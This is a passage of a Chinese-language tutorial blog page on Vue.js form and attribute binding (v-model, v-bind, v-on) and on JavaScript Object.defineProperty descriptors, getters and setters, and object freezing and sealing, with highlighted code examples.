class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;pear&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;checkArray&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;checkbox&quot;</span>&gt;</span>&#123;&#123;pear&#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;checkArray | json&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>checkArray中的值会根据是否选中进行关联变化</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">  &lt;meta name=&quot;viewport&quot;</span><br><span class="line">        content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;&gt;</span><br><span class="line">  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;</span><br><span class="line">  &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">  &lt;!--1. CheckBox单选框--&gt;</span><br><span class="line">  &lt;label for=&quot;license&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;checkbox&quot; id=&quot;license&quot; v-model=&quot;isAgree&quot;&gt;同意协议</span><br><span class="line">  &lt;/label&gt;</span><br><span class="line">  &lt;h2&gt;你选择的是：&#123;&#123;isAgree&#125;&#125;&lt;/h2&gt;</span><br><span class="line">  &lt;button :disabled=&quot;!isAgree&quot;&gt;下一步&lt;/button&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &lt;!--2. CheckBox多选框--&gt;</span><br><span class="line">  &lt;input type=&quot;checkbox&quot; value=&quot;篮球&quot; v-model=&quot;hobbies&quot;&gt;篮球</span><br><span class="line">  &lt;input type=&quot;checkbox&quot; value=&quot;足球&quot; v-model=&quot;hobbies&quot;&gt;足球</span><br><span class="line">  &lt;input type=&quot;checkbox&quot; value=&quot;排球&quot; v-model=&quot;hobbies&quot;&gt;排球</span><br><span class="line">  &lt;input type=&quot;checkbox&quot; value=&quot;羽毛球&quot; v-model=&quot;hobbies&quot;&gt;羽毛球</span><br><span class="line">  &lt;h2&gt;你的爱好是：&#123;&#123;hobbies&#125;&#125;&lt;/h2&gt;</span><br><span class="line">  &#123;&#123;message&#125;&#125;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;../vue.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  const app=new Vue(&#123;</span><br><span class="line">    el:&#x27;#app&#x27;,</span><br><span class="line">    data:&#123;</span><br><span class="line">      message:&#x27;hello&#x27;,</span><br><span class="line">      isAgree:false,//单选框</span><br><span class="line">      hobbies:[]//多选框</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="4-绑定select"><a href="#4-绑定select" class="headerlink" title="4. 绑定select"></a>4. 绑定select</h5><p>（1）绑定到单个select<br> （2）绑定多个select时，同样适用数组</p><h5 id="5-增加参数"><a href="#5-增加参数" class="headerlink" title="5. 增加参数"></a>5. 增加参数</h5><p>（1）lazy<br> 将输入框的input事件改为change事件，使得输入框在change事件中更新而不是input<br> 关于change事件和input事件的区别，简单说来是：<br> change事件必须是在输入框失去焦点之后才会触发，而input事件可以实时监测。</p><p>（2）number<br> 将文本框输入的值都变为数字，如果是变为数字之后是NAN，则返回原始值</p><p>（3）trim<br> 取出输入的字符串的首尾空格</p><hr><h4 id="二、v-bind"><a href="#二、v-bind" class="headerlink" title="二、v-bind"></a>二、v-bind</h4><h5 id="1-绑定文本"><a href="#1-绑定文本" class="headerlink" title="1.绑定文本"></a>1.绑定文本</h5><p>直接用v-bind或者{undefined{}}</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p v-bind=<span class="string">&quot;message&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h5 id="2-绑定属性"><a href="#2-绑定属性" class="headerlink" title="2.绑定属性"></a>2.绑定属性</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;p v-bind:src=<span class="string">&quot;http://....&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">v-bind:class</span>=<span class="string">&quot;http://....&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">v-bind:style</span>=<span class="string">&quot;http://....&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h5 id="3-绑定表达式"><a href="#3-绑定表达式" class="headerlink" title="3.绑定表达式"></a>3.绑定表达式</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; number + <span class="number">1</span> &#125;&#125;</span><br><span class="line">&#123;&#123; ok ? <span class="string">&#x27;YES&#x27;</span> : <span class="string">&#x27;NO&#x27;</span> &#125;&#125;</span><br><span class="line">&#123;&#123; message.split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure><h5 id="4-绑定html"><a href="#4-绑定html" class="headerlink" title="4.绑定html"></a>4.绑定html</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;&#123;&#123;&#123; raw_html &#125;&#125;&#125;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>这个时候必须要使用三个{}</p><h3 id="v-bind、v-model、v-on"><a href="#v-bind、v-model、v-on" class="headerlink" title="v-bind、v-model、v-on"></a>v-bind、v-model、v-on</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v-bind 指令可以用于响应式地更新 HTML 特性：</span><br><span class="line">&lt;span v-bind:title=<span class="string">&quot;message&quot;</span>&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">:title</span>=<span class="string">&quot;message&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v-on 指令，它用于监听 DOM 事件</span><br><span class="line">&lt;form v-on:submit.prevent=<span class="string">&quot;onSubmit&quot;</span>&gt;...&lt;/form&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">form</span> @<span class="attr">submit.prevent</span>=<span class="string">&quot;onSubmit&quot;</span>&gt;</span>...<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">主要是用于表单上数据的双向绑定</span><br><span class="line">input type=<span class="string">&quot;text&quot;</span> v-model=<span class="string">&quot;mes&quot;</span>&gt;  </span><br><span class="line">此时mes值就与input的值进行双向绑定</span><br></pre></td></tr></table></figure><h2 id="数据代理"><a href="#数据代理" class="headerlink" title="数据代理"></a>数据代理</h2><h3 id="Object-defineProperty"><a href="#Object-defineProperty" class="headerlink" title="Object.defineProperty()"></a>Object.defineProperty()</h3><p><img src="https://upload-images.jianshu.io/upload_images/5016475-c1ff7e988c760ebc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p><p>对象的定义与赋值</p><p>经常使用的定义与赋值方法<code>obj.prop =value</code>或者<code>obj[&#39;prop&#39;]=value</code></p><p><img src="https://upload-images.jianshu.io/upload_images/5016475-4d7533fee7979ef4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1004/format/webp" alt="img"></p><p>Object.defineProperty()语法说明</p><p><code>Object.defineProperty()</code>的作用就是直接在一个对象上定义一个新属性，或者修改一个已经存在的属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.defineProperty(obj, prop, desc)</span><br></pre></td></tr></table></figure><ol><li>obj 需要定义属性的当前对象</li><li>prop 当前需要定义的属性名</li><li>desc 属性描述符</li></ol><p>一般通过为对象的属性赋值的情况下，对象的属性可以修改也可以删除，但是通过Object.defineProperty()定义属性，通过描述符的设置可以进行更精准的控制对象属性。</p><h5 id="属性的特性以及内部属性"><a href="#属性的特性以及内部属性" class="headerlink" title="属性的特性以及内部属性"></a>属性的特性以及内部属性</h5><p>javacript 有三种类型的属性</p><ol><li>命名数据属性：拥有一个确定的值的属性。这也是最常见的属性</li><li>命名访问器属性：通过<code>getter</code>和<code>setter</code>进行读取和赋值的属性</li><li>内部属性：由JavaScript引擎内部使用的属性，不能通过JavaScript代码直接访问到，不过可以通过一些方法间接的读取和设置。比如，每个对象都有一个内部属性<code>[[Prototype]]</code>，你不能直接访问这个属性，但可以通过<code>Object.getPrototypeOf()</code>方法间接的读取到它的值。虽然内部属性通常用一个双吕括号包围的名称来表示，但实际上这并不是它们的名字，它们是一种抽象操作，是不可见的，根本没有上面两种属性有的那种字符串类型的属性</li></ol><h5 id="属性描述符"><a href="#属性描述符" class="headerlink" title="属性描述符"></a>属性描述符</h5><p>通过Object.defineProperty()为对象定义属性，有两种形式，且不能混合使用，分别为数据描述符，存取描述符，下面分别描述下两者的区别：</p><h6 id="数据描述符-–特有的两个属性（value-writable）"><a href="#数据描述符-–特有的两个属性（value-writable）" class="headerlink" title="数据描述符 –特有的两个属性（value,writable）"></a>数据描述符 –特有的两个属性（value,writable）</h6><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> Person = &#123;&#125;</span><br><span class="line">Object.defineProperty(Person, <span class="string">&#x27;name&#x27;</span>, &#123;</span><br><span class="line">   <span class="keyword">value</span>: <span class="string">&#x27;jack&#x27;</span>,</span><br><span class="line">   writable: <span class="literal">true</span> <span class="comment">// 是否可以改变</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/5016475-341b21261bd9366c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/916/format/webp" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/5016475-69e4dc45d0a6c764.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/876/format/webp" alt="img"></p><p>注意，如果描述符中的某些属性被省略，会使用以下默认规则：</p><p><img src="https://upload-images.jianshu.io/upload_images/5016475-9cd41a36735b667d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p><h6 id="存取描述符-–是由一对-getter、setter-函数功能来描述的属性"><a href="#存取描述符-–是由一对-getter、setter-函数功能来描述的属性" class="headerlink" title="存取描述符 –是由一对 getter、setter 函数功能来描述的属性"></a>存取描述符 –是由一对 getter、setter 函数功能来描述的属性</h6><p><code>get</code>：一个给属性提供<code>getter</code>的方法，如果没有<code>getter</code>则为<code>undefined</code>。该方法返回值被用作属性值。默认为<code>undefined</code>。<br> <code>set</code>：一个给属性提供<code>setter</code>的方法，如果没有<code>setter</code>则为<code>undefined</code>。该方法将接受唯一参数，并将该参数的新值分配给该属性。默认值为<code>undefined</code>。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> Person = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> temp = <span class="literal">null</span></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(Person, <span class="string">&#x27;name&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">get</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">set</span>: <span class="function"><span class="keyword">function</span> (<span class="params">val</span>) </span>&#123;</span><br><span class="line">    temp = val</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/5016475-96b00b053d6fd42a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/854/format/webp" alt="img"></p><h5 id="数据描述符和存取描述均具有以下描述符"><a href="#数据描述符和存取描述均具有以下描述符" class="headerlink" title="数据描述符和存取描述均具有以下描述符"></a>数据描述符和存取描述均具有以下描述符</h5><ol><li>configrable   描述属性是否配置，以及可否删除</li><li>enumerable  描述属性是否会出现在for in 或者 Object.keys()的遍历中</li></ol><h6 id="configrable-代码片段分析"><a href="#configrable-代码片段分析" class="headerlink" title="configrable 代码片段分析"></a>configrable 代码片段分析</h6><p><img src="https://upload-images.jianshu.io/upload_images/5016475-885fbf1df3d6a465.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p><p>configurable:false不能删除属性</p><p><img src="https://upload-images.jianshu.io/upload_images/5016475-65abac28f1baac3b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p><p>configurable:false不能重新定义属性</p><p><img src="https://upload-images.jianshu.io/upload_images/5016475-6cfce802f175016b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/942/format/webp" alt="img"></p><p>等价上一张图的代码</p><p><img src="https://upload-images.jianshu.io/upload_images/5016475-a89db7cd533efbcc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/882/format/webp" alt="img"></p><p>与上一张图的代码进行对比</p><p><img src="https://upload-images.jianshu.io/upload_images/5016475-fecfb1b9d9d4eee8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1150/format/webp" alt="img"></p><p>configurable:true能删除属性</p><p><img src="https://upload-images.jianshu.io/upload_images/5016475-210b70d4146f46ec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1022/format/webp" alt="img"></p><p>configurable:true能够定义属性</p><p><img src="https://upload-images.jianshu.io/upload_images/5016475-dadc376bbc6c23b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1086/format/webp" alt="img"></p><p>configurable:false与上图做对照</p><p>从以上代码运行结果分析总结可知：</p><blockquote><ol><li>configurable: false 时，不能删除当前属性，且不能重新配置当前属性的描述符(有一个小小的意外：可以把writable的状态由true改为false,但是无法由false改为true),但是在writable: true的情况下，可以改变value的值</li><li>configurable: true时，可以删除当前属性，可以配置当前属性所有描述符。</li></ol></blockquote><h6 id="enumerable-代码片段分析"><a href="#enumerable-代码片段分析" class="headerlink" title="enumerable 代码片段分析"></a>enumerable 代码片段分析</h6><p><img src="https://upload-images.jianshu.io/upload_images/5016475-25ab11c6f042ed86.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p><p>注意：以下二种区别</p><p><img src="https://upload-images.jianshu.io/upload_images/5016475-d700d59cf2c6251b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/898/format/webp" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/5016475-ed831b5f32e5cac2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/882/format/webp" alt="img"></p><h5 id="不变性"><a href="#不变性" class="headerlink" title="不变性"></a>不变性</h5><ol><li>对象常量<br> 结合writable: false 和 configurable: false  就可以创建一个真正的常量属性（不可修改，不可重新定义或者删除）</li></ol><p><img src="https://upload-images.jianshu.io/upload_images/5016475-53ceb8f0c574556c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p><p>对象常量</p><ol><li>禁止扩展<br> 如果你想禁止一个对象添加新属性并且保留已有属性，就可以使用Object.preventExtensions(…)</li></ol><p><img src="https://upload-images.jianshu.io/upload_images/5016475-e04c673d73514ae1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p><p>禁止扩展片段1</p><p><img src="https://upload-images.jianshu.io/upload_images/5016475-bd0d1ef4b505d0bb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1058/format/webp" alt="img"></p><p>禁止扩展片段2</p><p>在非严格模式下，创建属性gender会静默失败，在严格模式下，将会抛出异常。</p><ol><li>密封<br> Object.seal()会创建一个密封的对象，这个方法实际上会在一个现有对象上调用object.preventExtensions(…)并把所有现有属性标记为configurable:false。</li></ol><p><img src="https://upload-images.jianshu.io/upload_images/5016475-446c94b28768fbe9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p><p>密封</p><p>所以， 密封之后不仅不能添加新属性，也不能重新配置或者删除任何现有属性（虽然可以改属性的值）</p><ol><li><p>冻结<br> Object.freeze()会创建一个冻结对象，这个方法实际上会在一个现有对象上调用Object.seal(),并把所有现有属性标记为writable: false,这样就无法修改它们的值。</p><p><img src="https://upload-images.jianshu.io/upload_images/5016475-1f6ad10fa20995ae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p><p>冻结</p></li></ol><p>这个方法是你可以应用在对象上级别最高的不可变性，它会禁止对于对象本身及其任意直接属性的修改（但是这个对象引用的其他对象是不受影响的）<br> 你可以深度冻结一个对象，具体方法为，首先这个对象上调用Object.freeze()然后遍历它引用的所有对象，并在这些对象上调用Object.freeze()。但是一定要小心，因为这么做有可能会无意中冻结其他共享对象。</p><h5 id="属性定义和属性赋值"><a href="#属性定义和属性赋值" class="headerlink" title="属性定义和属性赋值"></a>属性定义和属性赋值</h5><p>最后一小节，总结一下上述内容</p><h6 id="属性定义-通过Object-defineProperty-形式"><a href="#属性定义-通过Object-defineProperty-形式" class="headerlink" title="属性定义,通过Object.defineProperty()形式"></a>属性定义,通过Object.defineProperty()形式</h6><ol><li>如果Obj没有名为Prop的自身属性的话：如果Obj是可扩展的话，则创建Prop这个自身属性，否则拒绝</li><li>如果Obj已经有了名为Prop的自身属性：则按照下面的步骤重新配置这个属性</li><li>如果这个已有的属性是不可配置的，则进行下面的操作会被拒绝</li></ol><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: 将一个数据属性转换成访问器属性，反之变然</span><br><span class="line"><span class="number">2</span>: 改变<span class="string">`[[Configurable]]`</span>或<span class="string">`[[Enumerable]]`</span></span><br><span class="line"><span class="number">3</span>: 改变[[Writable]]由<span class="literal">false</span>变为<span class="literal">true</span></span><br><span class="line"><span class="number">4</span>: 在<span class="string">`[[Writable]]`</span>为<span class="string">`false`</span>时改变<span class="string">`[[Value]]`</span></span><br><span class="line"><span class="number">5</span>: 改变[[Get]]或[[<span class="built_in">Set</span>]]</span><br></pre></td></tr></table></figure><ol><li>否则这个已有的属性可以被重新配置</li></ol><h6 id="属性赋值-通过obj-prop-‘’prop”形式"><a href="#属性赋值-通过obj-prop-‘’prop”形式" class="headerlink" title="属性赋值,通过obj.prop = ‘’prop”形式"></a>属性赋值,通过obj.prop = ‘’prop”形式</h6><ol><li>如果在原型链上存在一个名为<code>P</code>的只读属性（只读的数据属性或者没有<code>setter</code>的访问器属性），则拒绝</li><li>如果在原型链上存在一个名为<code>P</code>的且拥有<code>setter</code>的访问器属性，则调用这个<code>setter</code></li><li>如果没有名为<code>P</code>的自身属性，则如果这个对象是可扩展的，就创建一个新属性，否则，如果这个对象是不可扩展的，则拒绝</li><li>如果已经存在一个可写的名为P的自身属性，则调用Object.defineProperty(),该操作只会更改<code>P</code>属性的值，其他的特性（比如可枚举性）都不会改变</li></ol><h5 id="作用以及影响"><a href="#作用以及影响" class="headerlink" title="作用以及影响"></a>作用以及影响</h5><p>属性的定义操作和赋值操作各自有自己的作用和影响。<br> <strong>赋值可能会调用原型上的<code>setter</code>，定义会创建一个自身属性</strong>。<br> <strong>原型链中的同名只读属性可能会阻止赋值操作，但不会阻止定义操作</strong>。如果原型链中存在一个同名的只读属性，则无法通过赋值的方式在原对象上添加这个自身属性，必须使用定义操作才可以。这项限制是在ECMAScript 5.1中引入的</p><p><img src="https://upload-images.jianshu.io/upload_images/5016475-f978709d73c32b5d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/5016475-d6e8aa6461813e68.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/944/format/webp" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/5016475-f42ff3eac0792f2a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/5016475-3561b2bb74a80778.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p><p> 赋值运算符不会改变原型链上的属性<br> 不能通过为<code>obj.foo</code>赋值来改变<code>proto.foo</code>的值。这种操作只会在<code>obj</code>上新建一个自身属性</p><p><img src="https://upload-images.jianshu.io/upload_images/5016475-ba6affa8f78c4a89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1040/format/webp" alt="img"></p><p> 对象字面量中的属性是通过定义操作添加的。</p><p><img src="https://upload-images.jianshu.io/upload_images/5016475-d91e7e26decfa23b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/802/format/webp" alt="img"></p><p>再次啰嗦一次，记住以下两种形式的区别：</p><p><img src="https://upload-images.jianshu.io/upload_images/5016475-16ef54cf96c184da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p><p>上面的代码等同于：</p><p><img src="https://upload-images.jianshu.io/upload_images/5016475-b4633515fd327cec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p><p>另一方面：</p><p><img src="https://upload-images.jianshu.io/upload_images/5016475-8a2a3b2da50e0868.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p><p>上面的代码等同于：</p><p><img src="https://upload-images.jianshu.io/upload_images/5016475-f5fa67373fc34d36.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>回顾Object.defineproperty方法<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> &gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">let</span> number = <span class="number">18</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">let</span> person = &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;张三&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">Object</span>.defineProperty(person,<span class="string">&#x27;age&#x27;</span>,&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// value:18,</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// enumerable:true, //控制属性是否可以枚举，默认值是false</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// writable:true, //控制属性是否可以被修改，默认值是false</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// configurable:true //控制属性是否可以被删除，默认值是false</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">get</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">console</span>.log(<span class="string">&#x27;有人读取age属性了&#x27;</span>)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">return</span> number</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">set</span>(<span class="params">value</span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">console</span>.log(<span class="string">&#x27;有人修改了age属性，且值是&#x27;</span>,value)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">number = value</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// console.log(Object.keys(person))</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">console</span>.log(person)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 